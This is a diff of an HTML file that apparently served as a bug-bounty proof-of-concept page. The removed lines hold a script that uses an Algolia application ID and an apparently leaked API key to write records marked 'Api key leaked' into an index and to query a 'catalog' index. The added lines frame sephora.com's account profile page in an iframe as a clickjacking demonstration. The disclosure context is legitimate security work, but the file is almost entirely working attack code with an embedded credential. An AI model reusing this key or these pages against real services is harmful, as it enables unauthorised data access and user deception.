@@ -1,35 +1,4 @@
 <!DOCTYPE html>
- <script src="https://cdn.jsdelivr.net/algoliasearch/3.24.7/algoliasearch.min.js"></script>
-
-    <script>
-        var client = algoliasearch('OS16XJPWDD', 'NzQxN2QyMGNmMDM1OTc1ZDRiOTBjOWE0NWM5MjQ1MGY4ZDU5YjYzMTYwYTgwZjYwMzZkMjY3ZDc5OTY2ZTZmNG51bWVyaWNGaWx0ZXJzPW9pZCUzRDMwMzQ\u003D');
-        var index = client.initIndex('johnstone');
-//声明Json数组
-var objects = [{
-  firstname: 'john',
-  lastname: 'stone'
-}, {
-  firstname: 'Hackerone',
-  lastname: 'Api key leaked'
-}];
- 
- 
-//add objects
-index.addObjects(objects, function(err, content) {
-  if (err) {
-    console.error(err);
-  }
-});
-     
-     
-      var index1 = client.initIndex('catalog');
-    index1.search({
-      query: 'XX'
-      },
-      function searchDone(err, content) {
-        if (err) throw err;
-
-        console.log(content.hits);
-      }
-    );
-    </script>
+<body>
+ Clickjacking on profile page of account
+ <iframe src="https://www.sephora.com/profile/MyAccount" width="1024" height="800"></iframe>
